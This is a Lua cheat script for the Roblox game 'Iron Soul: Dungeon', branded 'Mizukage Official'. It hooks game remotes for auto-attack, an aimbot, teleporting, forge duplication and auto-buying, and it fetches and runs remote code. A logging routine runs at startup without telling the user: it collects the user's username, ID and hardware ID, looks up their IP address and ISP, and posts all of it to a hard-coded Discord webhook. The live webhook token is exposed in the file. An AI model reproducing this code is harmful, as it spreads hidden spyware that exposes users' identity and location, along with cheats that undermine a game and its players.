
local WEBHOOK_URL = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj"
local SCRIPT_RAW_URL = "https://raw.githubusercontent.com/kazukage-id/Mizukage-Official/refs/heads/main/scripts/ironsoul.lua" -- Optional

-- [ANTI DUPLICATION & QUEUE ON TELEPORT]
if getgenv().MizuBlankBase then
    return game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Mizukage Engine",
        Text = "System is already running in memory."
    })
end
getgenv().MizuBlankBase = true

if syn and syn.queue_on_teleport then
    pcall(function() syn.queue_on_teleport('loadstring(game:HttpGet("' .. SCRIPT_RAW_URL .. '"))()') end)
elseif queue_on_teleport then
    pcall(function() queue_on_teleport('loadstring(game:HttpGet("' .. SCRIPT_RAW_URL .. '"))()') end)
end

--================================================
-- [SECTION 1] SERVICES & FRAMEWORK
--================================================
local Services = setmetatable({}, {
    __index = function(t, k)
        local s = game:GetService(k)
        t[k] = s
        return s
    end
})

local Players = Services.Players
local LocalPlayer = Players.LocalPlayer
local RunService = Services.RunService
local Workspace = Services.Workspace
local GuiService = Services.GuiService
local TeleportService = Services.TeleportService
local HttpService = Services.HttpService
local UserInputService = Services.UserInputService
local VirtualUser = Services.VirtualUser

local ReplicatedStorage = Services.ReplicatedStorage
local Framework = ReplicatedStorage:FindFirstChild("Framework")
local Remotes = ReplicatedStorage:FindFirstChild("Remotes")

local PlayerActionRE = Remotes and Remotes:FindFirstChild("PlayerActionRE")
local StatsRE = Remotes and Remotes:FindFirstChild("StatsRE")
local TaskRE = Framework and Framework:FindFirstChild("Features") and Framework.Features:FindFirstChild("TaskSystem") and Framework.Features.TaskSystem:FindFirstChild("TaskRE")
local RedPointRE = Framework and Framework:FindFirstChild("Systems") and Framework.Systems:FindFirstChild("RedPointSystem") and Framework.Systems.RedPointSystem.RedPointUtil:FindFirstChild("RemoteEvent")
local EquipmentRE = Framework and Framework:FindFirstChild("Gameplay") and Framework.Gameplay:FindFirstChild("EquipmentSystem") and Framework.Gameplay.EquipmentSystem:FindFirstChild("EquipmentRE")
local SeasonRE = Framework and Framework:FindFirstChild("Features") and Framework.Features:FindFirstChild("SeasonSystem") and Framework.Features.SeasonSystem.SeasonUtil:FindFirstChild("RemoteEvent")
local DailyQuestRE = Framework and Framework:FindFirstChild("Features") and Framework.Features:FindFirstChild("DailyQuestSystem") and Framework.Features.DailyQuestSystem:FindFirstChild("RE")
local WorldRE = Framework and Framework:FindFirstChild("Gameplay") and Framework.Gameplay:FindFirstChild("WorldPlace") and Framework.Gameplay.WorldPlace.WorldUtil:FindFirstChild("RemoteEvent")
local ForgeRF = Framework and Framework:FindFirstChild("Features") and Framework.Features:FindFirstChild("ForgeSystem") and Framework.Features.ForgeSystem:FindFirstChild("ForgeRF")
local ConsumableShopUtil = Framework and Framework:FindFirstChild("Features") and Framework.Features:FindFirstChild("ConsumableShopSystem") and Framework.Features.ConsumableShopSystem:FindFirstChild("ConsumableShopUtil") and Framework.Features.ConsumableShopSystem.ConsumableShopUtil:FindFirstChild("RemoteEvent")

--================================================
-- [SECTION 2] SMART MODULES (V7.2 SPY & SHOP)
--================================================

-- 1. UUID SPY (Direct to Dropdown)
getgenv().CapturedUUIDs = {}
getgenv().UUIDDropdownList = {"[Awaiting Data...]"}

local function AddToSpy(uuid, sourceName)
    if not getgenv().CapturedUUIDs[uuid] then
        getgenv().CapturedUUIDs[uuid] = sourceName
        
        -- Update Dropdown List Array
        local formatted = uuid .. " | " .. sourceName
        table.insert(getgenv().UUIDDropdownList, formatted)
        
        -- Remove default waiting text if data exists
        if getgenv().UUIDDropdownList[1] == "[Awaiting Data...]" then
            table.remove(getgenv().UUIDDropdownList, 1)
        end
    end
end

-- Inject Spy into RemoteEvents (Non-Yielding)
task.spawn(function()
    local mt = getrawmetatable(game)
    if not mt then return end
    local oldNamecall = mt.__namecall
    setreadonly(mt, false)

    mt.__namecall = function(self, ...)
        local method = getnamecallmethod()
        local args = {...}

        if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
            if self.Name == "EquipmentRE" or self.Name == "ForgeRF" then
                for _, arg in pairs(args) do
                    if type(arg) == "string" and #arg > 20 and string.match(arg, "^[%w%-]+$") then
                        AddToSpy(arg, self.Name .. " (Intercepted)")
                    elseif type(arg) == "table" then
                        if arg.UUID then AddToSpy(arg.UUID, "Table: " .. self.Name) end
                    end
                end
            end
        end
        return oldNamecall(self, ...)
    end
    setreadonly(mt, true)
end)

-- 2. SMART SHOP DETECTOR
local ShopItemsList = {"[Scanning Shop...]"}
local ShopDataMap = {}

local function ScanShop()
    ShopItemsList = {}
    ShopDataMap = {}
    
    local Configs = ReplicatedStorage:FindFirstChild("Configs")
    if Configs then
        local ConsumableShopConfig = Configs:FindFirstChild("ConsumableShopConfig") or Configs:FindFirstChild("ShopConfigs")
        if ConsumableShopConfig then
            pcall(function()
                local data = require(ConsumableShopConfig)
                for key, val in pairs(data) do
                    if type(val) == "table" and val.Price then
                        local itemName = val.Name or key
                        local currency = val.Currency or "Gold"
                        local price = val.Price
                        local formatString = string.format("[%s] %s - %s", currency, itemName, tostring(price))
                        table.insert(ShopItemsList, formatString)
                        ShopDataMap[formatString] = key -- Store actual ID (e.g., GoldShop_14)
                    end
                end
            end)
        end
    end
    
    if #ShopItemsList == 0 then
        -- Fallback Based on Spy Traffic if Configs are obfuscated
        for i=1, 35 do table.insert(ShopItemsList, "GoldShop_"..tostring(i)) end
        for i=1, 15 do table.insert(ShopItemsList, "BondShop_"..tostring(i)) end
    end
end
ScanShop()

--================================================
-- [SECTION 3] AUTO RECONNECT & LOGGER
--================================================
local function SetupAutoReconnect()
    GuiService.ErrorMessageChanged:Connect(function()
        task.wait(1)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end)
    LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end

local function SendGameLog()
    if not WEBHOOK_URL or WEBHOOK_URL == "" or string.find(WEBHOOK_URL, "MASUKKAN") then return end
    task.spawn(function()
        task.wait(3)
        local Stats = game:GetService("Stats")
        local Market = game:GetService("MarketplaceService")
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if not request then return end 

        local UserId = LocalPlayer.UserId
        local DisplayName = LocalPlayer.DisplayName
        local Username = LocalPlayer.Name
        local PlaceId = game.PlaceId
        
        local HWID = "Unknown"
        pcall(function() HWID = (gethwid and gethwid()) or (identifying and identifying()) or "Unknown" end)

        local IP_Data = { query = "Hidden", country = "Unknown", city = "Unknown", isp = "Unknown" }
        pcall(function() IP_Data = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json")) end)

        local GameName = "Unknown"
        pcall(function() GameName = Market:GetProductInfo(PlaceId).Name end)

        local Data = {
            ["username"] = "IRON SOUL",
            ["embeds"] = {{
                ["title"] = GameName .. " | LOG REPORT",
                ["color"] = 65280,
                ["fields"] = {
                    { ["name"] = "USER INFORMATION", ["value"] = string.format("> Display: %s\n> User: %s\n> ID: %s", DisplayName, Username, UserId), ["inline"] = true },
                    { ["name"] = "NETWORK", ["value"] = string.format("> IP: ||%s||\n> ISP: %s", IP_Data.query, IP_Data.isp), ["inline"] = true }
                }
            }}
        }
        request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(Data) })
    end)
end

--================================================
-- [SECTION 4] GLOBAL STATE & CORE LOGIC
--================================================
getgenv().MizuState = {
    IsRunning = true,
    HitScanAimbot = false,
    AutoAttack = false,
    AutoSkill = false,
    AutoPortal = false,
    AutoProgressStage = true,
    MaxPortalDistance = 150,
    
    OrbitEnabled = false,
    UndergroundMode = true,
    RadiusPutar = 6,
    AboveHeight = 15,
    UnderGroundHeight = 15,
    OrbitSpeed = 4.0,
    
    AntiPing = false,
    AutoEquip = false,
    AutoRewards = false,
    
    -- V7 Features
    FastForge = false,
    SelectedUUID = "",
    SelectedShopCurrency = "Gold",
    SelectedShopItemRaw = "",
    AutoBuyShop = false,
}

local CurrentAngle = 0
local IsEnteringPortal = false 
local PortalCooldown = false 

local function GetClosestEnemy()
    local closestDistance = 2000
    local closestTarget = nil
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return nil end
    local myPos = LocalPlayer.Character.HumanoidRootPart.Position

    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("Model") and obj ~= LocalPlayer.Character then
            local root = obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChild("PrimaryPart") or obj:FindFirstChild("Torso")
            local hum = obj:FindFirstChild("Humanoid")
            if root and ((hum and hum.Health > 0) or string.find(obj.Name:lower(), "crystal") or string.find(obj.Name:lower(), "tent") or string.find(obj.Name:lower(), "box") or string.find(obj.Name:lower(), "chest") or string.find(obj.Name:lower(), "bucket")) then
                local dist = (myPos - root.Position).Magnitude
                if dist < closestDistance then
                    closestDistance = dist
                    closestTarget = obj
                end
            end
        end
    end
    return closestTarget
end

local function TeleportToNextStagePortal()
    if PortalCooldown or not getgenv().MizuState.AutoProgressStage then return end 
    local myChar = LocalPlayer.Character
    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot or IsEnteringPortal then return end

    local bestPortal = nil
    local highestScore = 0
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
            local dist = (myRoot.Position - obj.Position).Magnitude
            if dist <= getgenv().MizuState.MaxPortalDistance then
                local score = 0
                local lowName = string.lower(obj.Name)
                if lowName:find("portal") or lowName:find("gate") or lowName:find("door") then score = score + 5
                elseif lowName:find("next") or lowName:find("exit") or lowName:find("finish") or lowName:find("teleport") then score = score + 4 end
                if obj:FindFirstChildOfClass("TouchTransmitter") then score = score + 3 end
                if obj.Material == Enum.Material.Neon then score = score + 3 end
                if obj.Size.Y > 5 and obj.Size.X > 5 then score = score + 2 end
                if score > highestScore then highestScore = score; bestPortal = obj end
            end
        end
    end

    if bestPortal and highestScore >= 3 then
        IsEnteringPortal = true
        PortalCooldown = true 
        myRoot.CFrame = CFrame.new(bestPortal.Position)
        task.wait(0.2) 
        myRoot.Velocity = Vector3.new(0, 0, 0)
        IsEnteringPortal = false
        task.spawn(function() task.wait(5.0); PortalCooldown = false end)
    end
end

local function ExecuteMageCombat(targetObj, type, stage)
    if not PlayerActionRE then return end
    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not myRoot then return end
    
    local tPos = targetObj:GetPivot().Position
    local dist = (myRoot.Position - tPos).Magnitude
    local simulatedFlyTime = math.clamp(dist / 100, 0.1, 1.5)
    
    local targetPayload = {
        [1] = { HitEnemy = targetObj, FlyTime = simulatedFlyTime }
    }
    
    if type == "Base" then
        PlayerActionRE:FireServer("SkillAction", "BaseAttack", stage)
        PlayerActionRE:FireServer("BulletShoot", "Staff_Atk2Staff_Atk2_" .. stage, targetPayload)
    elseif type == "Skill" then
        local skillName = "Skill" .. (stage == 3 and "U" or stage)
        PlayerActionRE:FireServer("SkillAction", skillName, stage)
        PlayerActionRE:FireServer("BulletShoot", "Staff_Skill_ArcaneMissiles2Staff_Skill_ArcaneMissiles2_" .. stage, targetPayload)
    end
end

local function StartGameLogic()
    task.spawn(function()
        local combo = 1
        local skillStage = 1
        RunService.Heartbeat:Connect(function()
            if not getgenv().MizuState.IsRunning then return end
            
            local targetEnemy = GetClosestEnemy()
            if targetEnemy then
                if getgenv().MizuState.AutoAttack then
                    pcall(function() ExecuteMageCombat(targetEnemy, "Base", combo) end)
                    combo = combo >= 5 and 1 or combo + 1
                end

                if getgenv().MizuState.AutoSkill then
                    pcall(function() ExecuteMageCombat(targetEnemy, "Skill", skillStage) end)
                    skillStage = skillStage >= 3 and 1 or skillStage + 1
                end
            end
        end)
    end)

    UserInputService.InputBegan:Connect(function(input, isProcessed)
        if isProcessed or not getgenv().MizuState.IsRunning or not getgenv().MizuState.HitScanAimbot then return end
        local isAttack = (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch)
        local isSkill1 = (input.KeyCode == Enum.KeyCode.One or input.KeyCode == Enum.KeyCode.ButtonX)
        local isSkill2 = (input.KeyCode == Enum.KeyCode.Two or input.KeyCode == Enum.KeyCode.ButtonY)
        local isSkillU = (input.KeyCode == Enum.KeyCode.Three or input.KeyCode == Enum.KeyCode.ButtonB)

        if isAttack or isSkill1 or isSkill2 or isSkillU then
            local targetEnemy = GetClosestEnemy()
            if targetEnemy then
                pcall(function()
                    if isAttack then ExecuteMageCombat(targetEnemy, "Base", math.random(1, 5)) end
                    if isSkill1 then ExecuteMageCombat(targetEnemy, "Skill", 1) end
                    if isSkill2 then ExecuteMageCombat(targetEnemy, "Skill", 2) end
                    if isSkillU then ExecuteMageCombat(targetEnemy, "Skill", 3) end
                end)
            end
        end
    end)

    task.spawn(function()
        local pingId = 150
        while getgenv().MizuState.IsRunning do
            task.wait(2)
            if getgenv().MizuState.AntiPing and StatsRE then pcall(function() StatsRE:FireServer("ping", {Id = pingId, Time = tick()}) end); pingId = pingId + 1 end
            if getgenv().MizuState.AutoEquip and EquipmentRE then pcall(function() EquipmentRE:FireServer("EquipBest", "Weapon"); EquipmentRE:FireServer("EquipBest", "Helmet"); EquipmentRE:FireServer("EquipBest", "Breastplate") end) end
            if getgenv().MizuState.AutoRewards then
                pcall(function()
                    if SeasonRE then SeasonRE:FireServer("TrySeasonLottery", 1) end
                    if DailyQuestRE then DailyQuestRE:FireServer("ClickGetReward") end
                    if UpdateLogRE then UpdateLogRE:FireServer("ClaimReward", "V10"); UpdateLogRE:FireServer("ClaimReward", "V9.5") end
                end)
            end
            if getgenv().MizuState.AutoPortal then
                pcall(TeleportToNextStagePortal)
                pcall(function()
                    local normalPortal = Workspace:FindFirstChild("Portal")
                    if normalPortal and normalPortal:FindFirstChild("Root") and normalPortal.Root:FindFirstChild("RF") then normalPortal.Root.RF:InvokeServer() end
                end)
            end
            
            -- Fast Forge Loop
            if getgenv().MizuState.FastForge and ForgeRF then
                pcall(function()
                    ForgeRF:InvokeServer("ForgeFinish")
                    ForgeRF:InvokeServer("ForgeResult", true)
                end)
            end
            
            -- Auto Buy Shop Loop
            if getgenv().MizuState.AutoBuyShop and ConsumableShopUtil then
                pcall(function()
                    local targetId = ShopDataMap[getgenv().MizuState.SelectedShopItemRaw] or getgenv().MizuState.SelectedShopItemRaw
                    ConsumableShopUtil:FireServer("BuyShopItem", getgenv().MizuState.SelectedShopCurrency, targetId)
                end)
            end
        end
    end)

    RunService.Heartbeat:Connect(function(dt)
        if not getgenv().MizuState.IsRunning then return end
        if not _G.MizuPlatform then
            _G.MizuPlatform = Instance.new("Part")
            _G.MizuPlatform.Name = "MizuAntiFall"
            _G.MizuPlatform.Size = Vector3.new(15, 1, 15)
            _G.MizuPlatform.Transparency = 1 
            _G.MizuPlatform.Anchored = true
            _G.MizuPlatform.CanCollide = true
            _G.MizuPlatform.Parent = Workspace
        end
        
        local myChar = LocalPlayer.Character
        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
        
        if myRoot then
            if getgenv().MizuState.OrbitEnabled and getgenv().MizuState.UndergroundMode then
                _G.MizuPlatform.Position = Vector3.new(myRoot.Position.X, myRoot.Position.Y - 3.5, myRoot.Position.Z)
                _G.MizuPlatform.CanCollide = true
            else
                _G.MizuPlatform.Position = Vector3.new(0, -5000, 0)
                _G.MizuPlatform.CanCollide = false
            end
        end

        if getgenv().MizuState.OrbitEnabled and myRoot and not IsEnteringPortal then
            local currentTarget = GetClosestEnemy()
            if currentTarget then
                local targetRoot = currentTarget:FindFirstChild("HumanoidRootPart") or currentTarget:FindFirstChild("PrimaryPart") or currentTarget:FindFirstChild("Torso")
                if targetRoot then
                    myRoot.Velocity = Vector3.new(0, myRoot.Velocity.Y, 0)
                    local tPos = currentTarget:GetPivot().Position
                    local finalY = tPos.Y
                    
                    if getgenv().MizuState.UndergroundMode then 
                        finalY = tPos.Y - getgenv().MizuState.UnderGroundHeight 
                    else 
                        finalY = tPos.Y + getgenv().MizuState.AboveHeight 
                    end
                    
                    CurrentAngle = CurrentAngle + (dt * getgenv().MizuState.OrbitSpeed)
                    local offX = math.sin(CurrentAngle) * getgenv().MizuState.OrbitRadius
                    local offZ = math.cos(CurrentAngle) * getgenv().MizuState.OrbitRadius
                    local finalPos = Vector3.new(tPos.X + offX, finalY, tPos.Z + offZ)
                    
                    if getgenv().MizuState.UndergroundMode then
                        myRoot.CFrame = CFrame.new(finalPos) * CFrame.Angles(math.rad(90), 0, 0)
                    else
                        myRoot.CFrame = CFrame.new(finalPos) * CFrame.Angles(math.rad(-90), 0, 0)
                    end
                end
            else
                if getgenv().MizuState.AutoProgressStage and not IsEnteringPortal and not PortalCooldown then
                    pcall(TeleportToNextStagePortal)
                end
            end
        end
    end)
    
    RunService.Stepped:Connect(function()
        if getgenv().MizuState.OrbitEnabled and getgenv().MizuState.UndergroundMode and LocalPlayer.Character then
            for _, part in pairs(LocalPlayer.Character:GetChildren()) do
                if part:IsA("BasePart") then part.CanCollide = false end
            end
        end
    end)
end

--================================================
-- [SECTION 5] WIND UI INTERFACE
--================================================
local function InitInterface()
    -- WIND UI LOADER DENGAN DOUBLE FALLBACK AGAR 100% TERBUKA
    local success, result = pcall(function()
        local _version = "1.6.65"
        return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/download/" .. _version .. "/main.lua"))()
    end)
    
    local WindUI = nil
    if success and type(result) == "table" then
        WindUI = result
    else
        warn("[MIZUKAGE] Primary Load Failed: " .. tostring(result) .. ". Using Fallback Server...")
        local fallbackSuccess, fallbackResult = pcall(function()
            return loadstring(game:HttpGet("https://tree-hub.vercel.app/api/UI/WindUI"))()
        end)
        if fallbackSuccess and type(fallbackResult) == "table" then
            WindUI = fallbackResult
        else
            warn("[MIZUKAGE] Fallback Load Failed: " .. tostring(fallbackResult))
            return -- Abort jika dua duanya mati (sangat jarang terjadi)
        end
    end

    local viewport = Workspace.CurrentCamera.ViewportSize
    local isMobile = viewport.X < 850
    local dynamicSize = isMobile and UDim2.fromOffset(viewport.X * 0.95, viewport.Y * 0.95) or UDim2.fromOffset(800, 520)
    local sidebarWidth = isMobile and 240 or 260

    -- 1. Create Main Window
    local Window = WindUI:CreateWindow({
        Title = "MIZUKAGE OFFICIAL 👑",
        Author = "IRON SOUL : DUNGEON",
        Folder = "MizukageBase",
        Size = dynamicSize,
        MinSize = Vector2.new(560, 350),
        MaxSize = Vector2.new(850, 560),
        Transparent = true,
        Theme = "Dark",
        Accent = Color3.fromRGB(0, 120, 255),
        SideBarWidth = sidebarWidth,
        HasOutline = true,
        BackgroundImageTransparency = 0.42,
        Background = "rbxassetid://137490169052447",
        
        User = {
            Enabled = true,
            Anonymous = false,
            Callback = function() end,
        }
    })

    -- 2. FPS & PING TAGS (Realtime)
    local FPSTag = Window:Tag({
        Title = "FPS: 0",
        Color = Color3.fromRGB(100, 150, 255),
    })
    
    local lastUpdate = tick()
    local frameCount = 0
    RunService.RenderStepped:Connect(function()
        if not getgenv().MizuState.IsRunning then return end
        frameCount = frameCount + 1
        local now = tick()
        if now - lastUpdate >= 1 then
            local fps = math.floor(frameCount / (now - lastUpdate))
            pcall(function()
                FPSTag:SetTitle("FPS: " .. fps)
                if fps >= 50 then FPSTag:SetColor(Color3.fromRGB(0, 255, 0))
                elseif fps >= 30 then FPSTag:SetColor(Color3.fromRGB(255, 200, 0))
                else FPSTag:SetColor(Color3.fromRGB(255, 0, 0)) end
            end)
            frameCount = 0
            lastUpdate = now
        end
    end)

    local PingTag = Window:Tag({
        Title = "Ping: 0ms",
        Color = Color3.fromRGB(100, 200, 255),
    })
    
    task.spawn(function()
        while getgenv().MizuState.IsRunning do
            local s, ping = pcall(function() return math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()) end)
            if s and ping then
                pcall(function()
                    PingTag:SetTitle("Ping: " .. ping .. "ms")
                    if ping <= 50 then PingTag:SetColor(Color3.fromRGB(0, 255, 0))
                    elseif ping <= 100 then PingTag:SetColor(Color3.fromRGB(255, 200, 0))
                    elseif ping <= 200 then PingTag:SetColor(Color3.fromRGB(255, 150, 0))
                    else PingTag:SetColor(Color3.fromRGB(255, 0, 0)) end
                end)
            end
            task.wait(2)
        end
    end)

    -- 3. BUILD TABS
    local TabCombat = Window:Tab({ Title = "Combat & Orbit", Icon = "sword" })
    local TabForge = Window:Tab({ Title = "Forge & Enhance", Icon = "hammer" })
    local TabShop = Window:Tab({ Title = "Smart Shop", Icon = "shopping-cart" })
    local TabWorld = Window:Tab({ Title = "World Navigation", Icon = "map" })
    local TabMisc = Window:Tab({ Title = "Utilities & Bypasses", Icon = "settings" })

    -- COMBAT
    TabCombat:Section({ Title = "Manual Assists" })
    TabCombat:Toggle({ Title = "Enable Hit-Scan Assist (Aimbot Mage)", Default = false, Callback = function(s) getgenv().MizuState.HitScanAimbot = s end })
    TabCombat:Button({ Title = "Execute Nuke (Force All Skills)", Variant = "Primary", Callback = function() 
        local target = GetClosestEnemy()
        if target then
            pcall(function()
                for i = 1, 5 do ExecuteMageCombat(target, "Base", i) end
                for i = 1, 3 do ExecuteMageCombat(target, "Skill", i) end
            end)
        end
    end })

    TabCombat:Section({ Title = "Full-Auto Orbit Farm" })
    TabCombat:Toggle({ Title = "Auto Base Attack", Default = false, Callback = function(s) getgenv().MizuState.AutoAttack = s end })
    TabCombat:Toggle({ Title = "Auto Magic Skills", Default = false, Callback = function(s) getgenv().MizuState.AutoSkill = s end })
    TabCombat:Toggle({ Title = "Enable Orbit Rotation", Default = false, Callback = function(s) getgenv().MizuState.OrbitEnabled = s end })
    TabCombat:Toggle({ Title = "Under Mode", Default = true, Callback = function(s) getgenv().MizuState.UndergroundMode = s end })
    TabCombat:Slider({ Title = "Under Height", Step = 1, Value = { Min = 5, Max = 50, Default = 15 }, Callback = function(value) getgenv().MizuState.UnderGroundHeight = value end })
    TabCombat:Slider({ Title = "Above Height", Step = 1, Value = { Min = 5, Max = 50, Default = 15 }, Callback = function(value) getgenv().MizuState.AboveHeight = value end })
    TabCombat:Slider({ Title = "Orbit Radius", Step = 1, Value = { Min = 2, Max = 15, Default = 6 }, Callback = function(value) getgenv().MizuState.OrbitRadius = value end })
    TabCombat:Slider({ Title = "Orbit Speed", Step = 0.5, Value = { Min = 1, Max = 10, Default = 4 }, Callback = function(value) getgenv().MizuState.OrbitSpeed = value end })

    -- FORGE & UUID SPY
    TabForge:Section({ Title = "Smart UUID Integration" })
    TabForge:Paragraph({ Title = "How to use", Desc = "Open your inventory or equip an item in-game. The UUID will automatically be captured and added to the list below." })
    
    local UUIDDropdown = TabForge:Dropdown({
        Title = "Captured UUID List (Live)",
        Values = getgenv().UUIDDropdownList,
        Value = getgenv().UUIDDropdownList[1],
        Callback = function(val)
            if type(val) == "table" then val = val[1] end
            if val and val ~= "[Awaiting Data...]" then
                local extractedUUID = string.match(val, "([^|]+)")
                if extractedUUID then 
                    extractedUUID = extractedUUID:gsub("%s+", "")
                    getgenv().MizuState.SelectedUUID = extractedUUID 
                    WindUI:Notify({Title = "Target Locked", Content = "UUID Selected: " .. extractedUUID, Duration = 2})
                end
            end
        end
    })
    
    TabForge:Button({ Title = "Refresh Captured UUID List", Variant = "Secondary", Callback = function()
        WindUI:Notify({Title = "Spy Active", Content = "Total items captured: " .. tostring(#getgenv().UUIDDropdownList), Duration = 3})
    end })

    TabForge:Section({ Title = "Extreme Re-Forge & Enhance" })
    TabForge:Toggle({ Title = "Enable Auto Re-Forge (Duplikasi)", Default = false, Callback = function(s) getgenv().MizuState.FastForge = s end })
    TabForge:Button({ Title = "Force Instant Finish (Selesaikan Paksa)", Variant = "Primary", Callback = function() 
        if ForgeRF then pcall(function() ForgeRF:InvokeServer("ForgeFinish"); ForgeRF:InvokeServer("ForgeResult", true) end) end
    end })
    
    TabForge:Button({ Title = "Enhance Selected UUID", Variant = "Primary", Callback = function()
        if EquipmentRE and getgenv().MizuState.SelectedUUID ~= "" then
            pcall(function() EquipmentRE:FireServer("Enchant", getgenv().MizuState.SelectedUUID, "2", "12") end)
            WindUI:Notify({Title = "Sent", Content = "Enchant request sent to server.", Duration = 2})
        else
            WindUI:Notify({Title = "Error", Content = "Please select a valid UUID first.", Duration = 2})
        end
    end })

    -- SHOP
    TabShop:Section({ Title = "Shop" })
    TabShop:Dropdown({ Title = "Select Currency", Values = {"Gold", "Bond", "SeasonCurrency", "Ticket1"}, Value = "Gold", Callback = function(val)
        if type(val)=="table" then val = val[1] end; getgenv().MizuState.SelectedShopCurrency = val 
    end})
    
    TabShop:Dropdown({
        Title = "Shop Items",
        Values = ShopItemsList,
        Value = ShopItemsList[1],
        Callback = function(val)
            if type(val)=="table" then val = val[1] end
            getgenv().MizuState.SelectedShopItemRaw = val
        end
    })
    TabShop:Toggle({ Title = "Auto Buy Selected Item", Default = false, Callback = function(s) getgenv().MizuState.AutoBuyShop = s end })
    TabShop:Button({ Title = "Force Buy 1x Now", Variant = "Primary", Callback = function()
        if ConsumableShopUtil then
            local targetId = ShopDataMap[getgenv().MizuState.SelectedShopItemRaw] or getgenv().MizuState.SelectedShopItemRaw
            pcall(function() ConsumableShopUtil:FireServer("BuyShopItem", getgenv().MizuState.SelectedShopCurrency, targetId) end)
        end
    end})

    -- WORLD & DUNGEON
    TabWorld:Section({ Title = "Auto Progression" })
    TabWorld:Toggle({ Title = "Auto Enter Portals", Default = false, Callback = function(s) getgenv().MizuState.AutoPortal = s end })
    TabWorld:Toggle({ Title = "Auto Equip Best Gear", Default = false, Callback = function(s) getgenv().MizuState.AutoEquip = s end })
    TabWorld:Toggle({ Title = "Auto Claim Rewards", Default = false, Callback = function(s) getgenv().MizuState.AutoRewards = s end })

    local selectedMap = "Cave1"
    TabWorld:Dropdown({ Title = "Select Map", Values = {"Cave1", "Cave2", "Cave3", "World1", "World2", "World3", "Prologue"}, Value = "Cave1", Callback = function(val) if type(val)=="table" then val=val[1] end; selectedMap = val end })
    local selectedDiff = 1
    TabWorld:Slider({ Title = "Difficulty Level", Step = 1, Value = { Min = 1, Max = 10, Default = 1 }, Callback = function(val) selectedDiff = val end })
    TabWorld:Button({ Title = "Force Enter Dungeon", Variant = "Primary", Callback = function() 
        if WorldRE then
            pcall(function()
                TaskRE:FireServer("UpdateTaskProgress", "OpenGUIWindow", "ScreenMatch")
                task.wait(0.2)
                WorldRE:FireServer("SelectWorld", selectedMap, selectedDiff)
            end)
        end
    end })

    -- MISC
    TabMisc:Section({ Title = "System Controls" })
    TabMisc:Toggle({ Title = "Anti-AFK & Ping Spoof", Default = false, Callback = function(s) getgenv().MizuState.AntiPing = s end })
    TabMisc:Button({ Title = "Bypass UI Constraints", Variant = "Secondary", Callback = function() 
        if TaskRE then
            local menus = {"ScreenForge", "ScreenBackpack", "ScreenGuidebook", "ScreenSettlement", "ScreenPlayerStatistics", "ScreenSeasonPass", "ScreenEquipSell", "ScreenRace", "ScreenFortifyDetail"}
            for _, menu in pairs(menus) do pcall(function() TaskRE:FireServer("UpdateTaskProgress", "OpenGUIWindow", menu) end) end
        end
    end })
    TabMisc:Button({ Title = "Clear Loot Notifications", Variant = "Secondary", Callback = function() 
        if RedPointRE then
            pcall(function()
                local categories = {"Ores", "Weapon", "Breastplate", "Helmet", "Material", "Currency", "Guidebook_Weapon", "Guidebook_Helmet", "Guidebook_Breastplate", "Race", "Potion"}
                for _, cat in pairs(categories) do RedPointRE:FireServer("Clear", cat, "IceCrystalOre"); RedPointRE:FireServer("Clear", cat, "cB2If13nFaFYahVPo00U4Yam") end
            end)
        end
    end })
    TabMisc:Button({ Title = "Unload Script (Terminate)", Variant = "Destructive", Callback = function()
        local Dialog = Window:Dialog({
            Icon = "alert-circle",
            Title = "Confirm Unload",
            IconThemed = true,
            Content = "Are you sure you want to stop Mizukage Base?",
            Buttons = {
                { Title = "Yes, Terminate", Variant = "Destructive", Callback = function()
                    getgenv().MizuState.IsRunning = false 
                    getgenv().MizuBlankBase = false 
                    if _G.MizuPlatform then _G.MizuPlatform:Destroy() end
                    WindUI:Destroy()
                end },
                { Title = "Cancel", Variant = "Secondary", Callback = function() end }
            }
        })
    end })

    WindUI:Notify({Title = "Mizukage Official", Content = "Initialization complete. V7.3 Engine running.", Duration = 5})
end

--================================================
-- [SECTION 6] BOOTSTRAP EXECUTION
--================================================
SetupAutoReconnect()
SendGameLog()
StartGameLogic()
task.spawn(InitInterface)
